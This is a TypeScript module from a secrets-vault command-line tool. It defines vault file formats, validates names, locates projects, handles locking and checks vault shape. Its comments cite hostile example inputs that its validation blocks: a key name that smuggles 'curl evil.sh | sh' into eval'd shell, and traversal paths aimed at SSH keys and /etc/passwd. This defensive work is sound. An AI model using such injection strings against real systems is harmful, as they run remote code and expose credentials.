/**
 * What a vault file is, and where it lives.
 *
 * The shapes of the file (members, sealed values, descriptions), the names a
 * set, a key or a vault may have, how a directory finds the vault that governs
 * it, the lock around a read-modify-write, and the shape check every file that
 * arrives over git goes through before anything trusts it. The Vault class, in
 * vault.ts, is what reads and writes one.
 */
import {
  existsSync, readFileSync, openSync, writeSync, closeSync, unlinkSync, statSync, realpathSync,
} from "node:fs";
import { dirname, join, resolve, isAbsolute, sep } from "node:path";
import { createHash } from "node:crypto";
import {
  decodePub,
  encodePub,
  fingerprint,
  ValidationError,
  isValidationError,
  type Opener,
  type Sealed,
  type Wrap,
} from "./crypto.ts";
import { isAgeRecipient, ageFingerprint } from "./age.ts";
import { hushHome } from "./identity.ts";

export interface Recipient {
  name: string;
  pk: string;
  role: "admin" | "member";
  addedAt: string;
  /** Absent means "x25519", so older vaults load unchanged. */
  type?: "x25519" | "age";
  /**
   * hush/v3: this member's signing key (`hush_spk_…`). An admin needs one to
   * change who can read the vault; the header they sign is checked against it.
   */
  spk?: string;
  /** A machine identity (`hush ci create`): it can never be an admin or sign. */
  ci?: true;
  /**
   * hush/v3: a *scoped* member — the only sets they can read. They hold no
   * wrap of the vault key, only of these sets' own keys. Absent for a full
   * member, who can read every set.
   */
  sets?: string[];
}

/**
 * hush/v3: a set with a key of its own, so it can be readable by a scoped
 * member without handing them the vault key. Every full member is wrapped in
 * too; `commit` is the signed commitment to the key (see header.ts).
 */
export interface SetKey {
  generation: number;
  wraps: Record<string, DekWrap>;
  commit?: string;
}

/** A data key wrapped either natively or by age (possibly via a hardware plugin). */
export type DekWrap = Wrap | { age: string };

export const isAgeWrap = (w: DekWrap): w is { age: string } => "age" in w;

export interface SecretEntry extends Sealed {
  /**
   * Which data-key generation sealed this value. Read by `staleValues()`, and
   * through it by `hush verify`: after a rotation every value must carry the
   * new generation, so one left behind means the re-seal did not finish — the
   * value is still readable only by whoever could read the old key.
   */
  gen: number;
  /**
   * 2 when this value's AAD binds `gen` (see crypto.ts SCHEME_V2). Absent on
   * values written by an older hush, whose AAD carried only `env|KEY`.
   *
   * Per entry rather than per file so a vault that was upgraded value by value
   * still opens: the generation is only fed to the AEAD for entries that
   * actually bound it.
   */
  v?: number;
  updatedAt: string;
  updatedBy: string;
  note?: string;
  /**
   * Names of members removed from the vault while they could read this value
   * (F-6). Cleared when the value is set again — by then it is a new value.
   * Plaintext beside the ciphertext, like the note: it says nothing secret.
   */
  exposed?: string[];
}

/**
 * What an environment is *for*, in the owner's words.
 *
 * Plaintext, beside the ciphertext rather than inside it: none of it is secret,
 * and keeping it out of the sealed payload means renaming or re-describing a set
 * never needs the data key — which for a hardware-backed identity is the
 * difference between editing a label and being asked to touch your YubiKey.
 *
 * Every field is optional. A set with no description is a set with no
 * description, not an error.
 */
export interface EnvMeta {
  /** The human spelling. The map key is the slug of it. */
  label?: string;
  description?: string;
  /** "Deploys only", "local dev", "the client's staging box". */
  whenToUse?: string;
  createdAt?: string;
  /** Where it came from, when it was imported from a file. */
  source?: string;
}

export interface VaultFile {
  scheme: string;
  id: string;
  name: string;
  createdAt: string;
  /**
   * `commit` is a commitment to the key (crypto.ts dekCommit) — in hush/v3 it
   * is part of the signed header, so a member can tell that the key they
   * unwrapped is the one an admin signed for.
   */
  dek: { generation: number; wraps: Record<string, DekWrap>; commit?: string };
  recipients: Record<string, Recipient>;
  envs: Record<string, Record<string, SecretEntry>>;
  /** Optional, and absent in vaults written before environments had names. */
  meta?: Record<string, EnvMeta>;
  /** hush/v3: sets with a key of their own. See SetKey. */
  setKeys?: Record<string, SetKey>;
  /** hush/v3: an admin's signature over the header (header.ts). */
  signature?: { by: string; sig: string };
}

/**
 * A POSIX environment variable name.
 *
 * This is a security boundary, not tidiness. Key names end up in generated
 * shell (`export ${k}=…`, which `hush hook` feeds to `eval`) and in .env
 * files. A member who can write to the vault could otherwise name a key
 * `FOO; curl evil.sh | sh; X` and run commands on every teammate's machine.
 */
const KEY_NAME = /^[A-Za-z_][A-Za-z0-9_]*$/;

/**
 * One segment of a scope name. The `(?!\.+$)` rules out ".", ".." and "....".
 *
 * Scopes are only object keys today, so a dot segment is harmless — but it costs
 * nothing to refuse now, and it stops a future change that derives a filename
 * from a scope from quietly becoming a path-traversal bug.
 */
const SCOPE_SEGMENT = /^(?!\.+$)[A-Za-z0-9_.-]+$/;

/**
 * Turn what someone typed into a name the rest of hush can carry.
 *
 * The slug is the real name — `hush run --env acme-production` — so it has to
 * satisfy SCOPE_SEGMENT, and it has to be stable enough that typing the same
 * label twice gives the same answer. The pretty spelling is kept alongside it.
 */
export function slugifyEnv(label: string): string {
  const slug = label
    .normalize("NFKD")
    .replace(/[\u0300-\u036f]/g, "")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-+|-+$/g, "")
    .slice(0, 48);
  // "..." and "" are both refused by assertScopeName, and neither makes a
  // useful name, so fall back rather than hand back something that will throw.
  return /^[a-z0-9]/.test(slug) ? slug : "env-" + createHash("sha256").update(label).digest("hex").slice(0, 8);
}

export function assertKeyName(key: string): void {
  if (!KEY_NAME.test(key)) {
    throw new ValidationError(
      `"${key.slice(0, 40)}" is not a valid variable name. ` +
        `Use letters, digits and underscores, starting with a letter or underscore.`,
    );
  }
}

export function assertScopeName(scope: string): void {
  const segments = scope.split("/");
  const valid =
    segments.length >= 1 &&
    segments.length <= 2 &&
    segments.every((s) => SCOPE_SEGMENT.test(s));
  if (!valid) {
    throw new ValidationError(
      `"${scope.slice(0, 40)}" is not a valid environment or account name. ` +
        `Use letters, digits, dot, dash and underscore, optionally as service/account.`,
    );
  }
}

export { ValidationError, isValidationError };

export const isValidKeyName = (k: string): boolean => KEY_NAME.test(k);

/**
 * A generous ceiling on one value. The largest real secret is a private key at
 * a few kilobytes; anything approaching this is a mistake — a whole file pasted
 * into the wrong field — and silently accepting it bloats a vault everyone on
 * the team has to clone.
 */
const MAX_VALUE_BYTES = 1024 * 1024;

/** Far past any real rotation history; see assertVaultShape. */
const MAX_GENERATION = 1_000_000;

/** A tag is a label, not a document. */
const MAX_NOTE_CHARS = 200;

export const trimNote = (note?: string): string | undefined => {
  const t = (note ?? "").trim();
  return t ? t.slice(0, MAX_NOTE_CHARS) : undefined;
};

/**
 * Render a string that came out of the vault file.
 *
 * Everything hush *writes* is validated, but the file arrives over git — from
 * a teammate, or from whoever opened the pull request — and a hand-edited or
 * badly merged one can carry anything at all. Two things go wrong when such a
 * string is printed straight to a terminal:
 *
 *   - Length. A five-megabyte note rendered by `hush ls` took the process out
 *     with a kill signal: a denial of service anyone who can propose a change
 *     could cause.
 *   - Control characters. An ANSI escape sequence in a note or a member name is
 *     interpreted by the terminal rather than shown by it, so it can erase the
 *     lines above and rewrite what the reviewer thinks they are looking at.
 *
 * Notes, member names, environment names and the vault's own name all go
 * through here before they are displayed.
 */
export function safeText(s: unknown, max = MAX_NOTE_CHARS): string | undefined {
  if (typeof s !== "string") return undefined;
  // Strip C0, DEL and C1 — the whole escape-sequence alphabet — but keep every
  // printable character, because a name is allowed to be in someone's language.
  const clean = s.replace(/[\u0000-\u001f\u007f-\u009f]/gu, " ").trim();
  if (!clean) return undefined;
  return clean.length > max ? clean.slice(0, max) + "\u2026" : clean;
}

export function assertValueSize(key: string, value: string): void {
  const bytes = Buffer.byteLength(value, "utf8");
  if (bytes > MAX_VALUE_BYTES) {
    throw new ValidationError(
      `"${key}" is ${Math.round(bytes / 1024)} KB, over the ${MAX_VALUE_BYTES / 1024} KB limit for one secret. ` +
        `If this is a file rather than a credential, keep it out of the vault.`,
    );
  }
}

export interface LinkFile {
  vault: string;
  env?: string;
}

/** .hush/use.json — which account this repo uses for each service. Committable. */
export type UseFile = Record<string, string>;

/**
 * @deprecated Compatibility read only. usedSets() in src/library.ts reads
 * this to fold each pair into a `service/account` set name, for a project set
 * up before sets were unified. Nothing writes this file any more — there is
 * no (service, account) pin left to save once a set is just a name.
 */
export function loadUse(hushDir: string): UseFile {
  const p = join(hushDir, "use.json");
  if (!existsSync(p)) return {};
  try {
    return JSON.parse(readFileSync(p, "utf8")) as UseFile;
  } catch {
    return {};
  }
}

// ------------------------------------------------------------------ locating

/**
 * Whether a `.hush` directory is hush's own home (`~/.hush`) rather than a
 * project's. They share a name, so from anywhere under $HOME the walk upward
 * reaches it — and once `hush use` or `hush init` had been run from the home
 * folder, every folder beneath it silently became part of that "project".
 */
export function isHushHome(hushDir: string): boolean {
  // Real paths, not spellings: macOS's /var is a symlink to /private/var, and
  // a home folder reached through a link would otherwise slip past this.
  const real = (p: string): string => {
    try {
      return realpathSync(p);
    } catch {
      return resolve(p);
    }
  };
  return real(hushDir) === real(hushHome());
}

/** Refuse to write project files (envs.json, vault.json, policy.json) into ~/.hush. */
export function assertProjectHushDir(hushDir: string): void {
  if (isHushHome(hushDir)) {
    throw new ValidationError(
      `${hushDir} is where hush keeps your key and library, not a project. ` +
        "Run this inside a project folder, or use --library for your own sets.",
    );
  }
}

/** Walk up from `start` looking for a `.hush` directory. */
export function findHushDir(start = process.cwd()): string | null {
  let dir = resolve(start);
  for (;;) {
    const candidate = join(dir, ".hush");
    if (isHushHome(candidate)) {
      const parent = dirname(dir);
      if (parent === dir) return null;
      dir = parent;
      continue;
    }
    // envs.json alone marks a project that only uses library sets — it gets a
    // vault of its own the first time it needs one, not before.
    if (
      existsSync(join(candidate, "vault.json")) ||
      existsSync(join(candidate, "link.json")) ||
      existsSync(join(candidate, "envs.json"))
    ) {
      return candidate;
    }
    const parent = dirname(dir);
    if (parent === dir) return null;
    dir = parent;
  }
}

/**
 * A vault name, as it appears under `~/.hush/vaults/<name>/`.
 *
 * One path segment, no traversal. Every caller that turns an outside string
 * into a vault path has to go through this: `path.join` normalises `..`, so a
 * name like "../../escape" is otherwise joined straight out of the vault root
 * and the create path then mkdirs the tree and writes a vault there.
 */
export function assertVaultName(name: string): void {
  if (!LINK_NAME.test(name)) {
    throw new ValidationError(
      `"${name.slice(0, 40)}" is not a vault name. A name is one segment: letters, digits, dot, dash, underscore.`,
    );
  }
}

export const namedVaultPath = (name: string): string => {
  assertVaultName(name);
  return join(hushHome(), "vaults", name, "vault.json");
};

/** Resolve the vault file a given directory is governed by. */
/**
 * A vault name, as it may appear in a committed `link.json`.
 *
 * One path segment, no traversal. The name is joined onto ~/.hush/vaults, so
 * "../../.ssh/id_ed25519" reaches outside it — and link.json is documented as
 * safe to commit, which means it arrives from whoever wrote the repository.
 */
const LINK_NAME = /^(?!\.+$)[A-Za-z0-9_.-]+$/;

/**
 * Strip the excerpt V8 puts in a JSON parse error.
 *
 * `Unexpected token 'r', "root:x:0:0:daemon" is not valid JSON` quotes the file
 * it failed on. For a vault that is your own file and harmless; for a path named
 * by someone else's link.json it is an arbitrary-file read whose first bytes get
 * printed. The position is the useful half and it survives.
 */
export const jsonErrorSummary = (e: unknown): string =>
  String((e as Error)?.message ?? e)
    .replace(/"[\s\S]*?"\.{0,3}/g, "…")
    .slice(0, 120);

/**
 * The vault a link points at must be a regular file.
 *
 * Not a directory, and above all not a device or a fifo: `{"vault":"/dev/zero"}`
 * in a cloned repo would otherwise make every hush command read for ever.
 */
function assertReadableVaultFile(path: string, why: string): void {
  let stat;
  try {
    stat = statSync(path);
  } catch {
    throw new Error(`No vault at ${path}.\n  ${why}`);
  }
  if (!stat.isFile()) {
    throw new Error(`${path} is not a vault file.\n  ${why}`);
  }
}

/**
 * Where the project is and whether it has a vault yet. A folder whose .hush/
 * holds only envs.json is a project — it uses library sets — but `vaultPath`
 * points at a file that does not exist, and a caller that needs one has to
 * say so rather than let Vault.open() fail with a path error.
 */
export function locateProject(
  start = process.cwd(),
): { vaultPath: string; hushDir: string; hasVault: boolean; env?: string } | null {
  const loc = resolveVaultPath(start);
  return loc && { ...loc, hasVault: existsSync(loc.vaultPath) };
}

export function resolveVaultPath(start = process.cwd()): { vaultPath: string; hushDir: string; env?: string } | null {
  if (process.env.HUSH_VAULT) {
    const p = resolve(process.env.HUSH_VAULT);
    return { vaultPath: p, hushDir: dirname(p), env: process.env.HUSH_ENV };
  }
  const hushDir = findHushDir(start);
  if (!hushDir) return null;

  const linkPath = join(hushDir, "link.json");
  if (existsSync(linkPath)) {
    let link: LinkFile;
    try {
      link = JSON.parse(readFileSync(linkPath, "utf8")) as LinkFile;
    } catch (e) {
      throw new Error(
        `${linkPath} is not valid JSON (${jsonErrorSummary(e)}).\n` +
          `  It should look like:  { "vault": "personal", "env": "default" }`,
      );
    }
    // Without this check a missing field surfaced as an internal path error.
    if (typeof link?.vault !== "string" || link.vault.trim() === "") {
      throw new Error(
        `${linkPath} does not name a vault.\n` +
          `  It should look like:  { "vault": "personal", "env": "default" }\n` +
          `  Or re-create it with:  hush link <vault-name>`,
      );
    }

    const named = link.vault.trim();
    let target: string;
    if (isAbsolute(named)) {
      target = named;
      // An absolute path in a committed link.json is not portable anyway — it
      // cannot exist on a teammate's machine — so it is either yours or it is
      // someone else's idea of where you should look. Never silent.
      if (!resolve(target).startsWith(resolve(hushHome()) + sep)) {
        process.stderr.write(
          `hush: ${linkPath} points outside ~/.hush — reading ${target}\n`,
        );
      }
    } else {
      if (!LINK_NAME.test(named)) {
        throw new Error(
          `${linkPath} names "${named.slice(0, 40)}", which is not a vault name.\n` +
            `  A name is one segment: letters, digits, dot, dash, underscore.\n` +
            `  If this file came from a repository you cloned, do not trust it.`,
        );
      }
      target = namedVaultPath(named);
    }
    assertReadableVaultFile(target, `Named by ${linkPath}. Re-create it with: hush link <vault-name>`);
    return { vaultPath: target, hushDir, env: process.env.HUSH_ENV || link.env };
  }
  return { vaultPath: join(hushDir, "vault.json"), hushDir, env: process.env.HUSH_ENV };
}

/**
 * Every identity slot this opener could match.
 *
 * `includeAge` exists because reading an age identity can mean talking to a
 * YubiKey. Resolving it when the vault has no age recipients at all would make
 * the hardware prompt on `hush ls`, for nothing.
 */
export function candidatesOf(
  id: Opener,
  includeAge = true,
): { fp: string; kind: "x25519" | "age"; recipient?: string }[] {
  const out: { fp: string; kind: "x25519" | "age"; recipient?: string }[] = [];
  if (id.pub) out.push({ fp: fingerprint(id.pub), kind: "x25519" });
  if (includeAge) {
    for (const r of id.age?.recipients ?? []) {
      out.push({ fp: ageFingerprint(r), kind: "age", recipient: r });
    }
  }
  return out;
}

/** How to name this opener in an error message. */
export function describeOpener(id: Opener): string {
  if (id.pub) return encodePub(id.pub);
  const first = id.age?.recipients[0];
  return first ?? "(no identity)";
}

// --------------------------------------------------------------------- lock

const sleepSync = (ms: number): void => {
  Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
};

export const hashOf = (s: string | Buffer): string =>
  createHash("sha256").update(s).digest("hex");

/**
 * Hold an exclusive lock for the duration of a read-modify-write.
 *
 * Without this, two `hush set` commands each read the vault, each add their own
 * key, and the second write silently discards the first. Running eight at once
 * left one survivor.
 */
/** A lock untouched for this long is assumed to belong to a dead process. */
const STALE_LOCK_MS = 30_000;

/** Tunable for CI and for tests that need to observe the wait, not sit through it. */
const lockTimeoutMs = (): number => Number(process.env.HUSH_LOCK_TIMEOUT_MS) || 15_000;

export function withVaultLock<T>(vaultPath: string, fn: () => T, timeoutMs = lockTimeoutMs()): T {
  const lockPath = `${vaultPath}.lock`;
  const deadline = Date.now() + timeoutMs;
  let fd: number | undefined;

  for (;;) {
    try {
      fd = openSync(lockPath, "wx");
      break;
    } catch (e) {
      if ((e as NodeJS.ErrnoException).code !== "EEXIST") throw e;

      // A process that died mid-write would otherwise wedge the vault forever,
      // so a lock that has not been touched for a while is reclaimable.
      //
      // Staleness is judged by mtime, never by the file's contents. open(…,"wx")
      // creates the file EMPTY and fills it a moment later; a reader landing in
      // that window sees "", fails to parse it, and — on the old "unreadable
      // means stale" rule — deleted a lock that was very much alive. Two writers
      // then held it at once and one's write was silently lost, while still
      // reporting success.
      let age: number;
      try {
        age = Date.now() - statSync(lockPath).mtimeMs;
      } catch {
        continue; // the lock vanished; race for it again
      }
      if (age > STALE_LOCK_MS) {
        try {
          // Only reclaim if nobody refreshed it since we looked.
          if (Date.now() - statSync(lockPath).mtimeMs > STALE_LOCK_MS) unlinkSync(lockPath);
        } catch { /* someone else got there first */ }
        continue;
      }
      if (Date.now() > deadline) {
        throw new Error(
          `Timed out waiting for the vault lock (${lockPath}). If no other hush is running, delete it.`,
        );
      }
      sleepSync(40);
    }
  }

  try {
    writeSync(fd, JSON.stringify({ pid: process.pid, at: Date.now() }));
    closeSync(fd);
    fd = undefined;
    return fn();
  } finally {
    if (fd !== undefined) {
      try { closeSync(fd); } catch { /* already closed */ }
    }
    try { unlinkSync(lockPath); } catch { /* best effort */ }
  }
}

// -------------------------------------------------------------------- vault

/**
 * Check the shape of a vault file before anything trusts it.
 *
 * `open()` used to verify only the scheme string, so every other field was taken
 * on faith from a file that arrives over git. That mattered most for the numbers:
 * a vault with `"generation": "lots"` decrypted perfectly while silently
 * disabling rollback detection, because `"lots" < 4` is false and so is
 * `"lots" > 4` — the comparison that is supposed to shout simply stopped
 * shouting. Same for a negative generation, and for a `gen` that is not a number.
 *
 * This is deliberately a shape check, not a schema: unknown extra fields are
 * fine, so a vault written by a newer hush still loads here.
 */
export function assertVaultShape(data: VaultFile, path: string): void {
  const bad = (why: string): never => {
    throw new Error(
      `The vault at ${path} is malformed: ${why}.\n` +
        `  A vault is not merged line by line. After a git merge: hush merge (it merges key by key).`,
    );
  };
  const isObject = (x: unknown): x is Record<string, unknown> =>
    typeof x === "object" && x !== null && !Array.isArray(x);
  // Bounded above as well as below. A vault claiming generation 2^53 decrypts
  // perfectly and poisons the rollback watermark for good: every genuine vault
  // afterwards reads as "rolled back", so the warning that is supposed to mean
  // something fires constantly and `hush verify` never passes again. A million
  // rotations is far beyond anything real — a daily rotation for 2700 years.
  const isGeneration = (x: unknown): x is number =>
    typeof x === "number" && Number.isSafeInteger(x) && x >= 1 && x <= MAX_GENERATION;

  if (!isObject(data.dek)) bad("it has no data key");
  if (!isGeneration(data.dek.generation)) {
    bad(`the key generation is ${JSON.stringify(data.dek.generation)} rather than a positive whole number`);
  }
  if (!isObject(data.dek.wraps)) bad("the data key has no wraps");
  if (!isObject(data.recipients)) bad("the member list is not an object");
  if (!isObject(data.envs)) bad("the environments are not an object");

  for (const [fp, r] of Object.entries(data.recipients)) {
    if (!isObject(r) || typeof r.pk !== "string" || typeof r.name !== "string") {
      bad(`member "${fp.slice(0, 12)}" is missing a name or a public key`);
    }
    // Checked on load rather than at the next rotation. Without this, a vault
    // carrying `"pk": "../../../etc/passwd"` opens and lists fine, and only
    // falls over later inside `hush team rm` — in the middle of a revocation,
    // which is the worst moment to discover the file was malformed all along.
    const pk = r.pk as string;
    if (!isAgeRecipient(pk)) {
      try {
        decodePub(pk);
      } catch {
        bad(`member "${(r.name as string).slice(0, 24)}" has a public key that is neither a hush key nor an age recipient`);
      }
    }
  }
  for (const [fp, r] of Object.entries(data.recipients)) {
    if (r.sets !== undefined && (!Array.isArray(r.sets) || !r.sets.every((x) => typeof x === "string"))) {
      bad(`member "${fp.slice(0, 12)}" has a set list that is not a list of names`);
    }
    if (r.spk !== undefined && (typeof r.spk !== "string" || !/^hush_spk_[A-Za-z0-9_-]{43}$/.test(r.spk))) {
      bad(`member "${fp.slice(0, 12)}" has a signing key that is not one`);
    }
    if (r.role !== undefined && r.role !== "admin" && r.role !== "member") bad(`member "${fp.slice(0, 12)}" has an unknown role`);
  }
  if (data.setKeys !== undefined) {
    if (!isObject(data.setKeys)) bad("the set keys are not an object");
    for (const [env, k] of Object.entries(data.setKeys)) {
      if (!isObject(k) || !isGeneration(k.generation) || !isObject(k.wraps)) bad(`the key of set "${env.slice(0, 40)}" is malformed`);
      if (!data.envs[env]) bad(`set "${env.slice(0, 40)}" has a key but no values`);
    }
  }
  if (data.signature !== undefined) {
    const sig = data.signature as unknown;
    if (!isObject(sig) || typeof sig.by !== "string" || typeof sig.sig !== "string") bad("the signature is malformed");
  }
  if (data.meta !== undefined) {
    if (!isObject(data.meta)) bad("the environment descriptions are not an object");
    for (const [env, m] of Object.entries(data.meta)) {
      if (!isObject(m)) bad(`the description of "${env.slice(0, 40)}" is not an object`);
    }
  }
  for (const [env, values] of Object.entries(data.envs)) {
    if (!isObject(values)) bad(`environment "${env.slice(0, 40)}" is not an object`);
    for (const [key, e] of Object.entries(values)) {
      if (!isObject(e) || typeof e.iv !== "string" || typeof e.ct !== "string" || typeof e.tag !== "string") {
        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" is not a sealed value`);
      }
      // A non-numeric generation here would defeat the re-seal check the same
      // way a non-numeric one on the data key defeats rollback detection.
      if (!isGeneration((e as unknown as SecretEntry).gen)) {
        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" records generation ${JSON.stringify((e as unknown as SecretEntry).gen)}`);
      }
      const aadVersion = (e as unknown as SecretEntry).v;
      if (aadVersion !== undefined && (!Number.isSafeInteger(aadVersion) || aadVersion < 2)) {
        bad(`"${env.slice(0, 20)}/${key.slice(0, 40)}" records an unknown AAD version ${JSON.stringify(aadVersion)}`);
      }
    }
  }
}

